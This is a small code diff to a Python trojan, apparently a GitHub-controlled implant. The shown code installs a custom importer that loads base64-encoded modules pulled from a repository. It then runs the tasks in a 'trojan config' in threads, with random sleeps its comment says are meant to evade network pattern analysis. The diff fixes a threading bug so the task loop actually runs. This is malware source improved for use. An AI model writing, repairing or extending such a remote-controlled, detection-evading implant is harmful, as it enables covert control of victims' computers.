@@ -77,7 +77,7 @@ class GitImporter(object):
             if newLibrary is not None:
                 # tells interpreter the module has been found and it can then load it
                 self.currentModuleCode = base64.b64decode(newLibrary)
-                
+
                 return self
 
         return None
@@ -103,6 +103,7 @@ def moduleRunner(module):
 
     return
 
+
 # add custom module importer to sys.meta_path
 sys.meta_path = [GitImporter()]
 
@@ -113,7 +114,7 @@ while True:
         config = getTrojanConfig()
 
         for task in config:
-            t = threading.Thread(target=moduleRunner(), args=(task['module'],))
+            t = threading.Thread(target=moduleRunner, args=(task['module'],))
             t.start()
             # sleep to hide from network pattern analysis tools
             time.sleep(random.randint(1, 10))
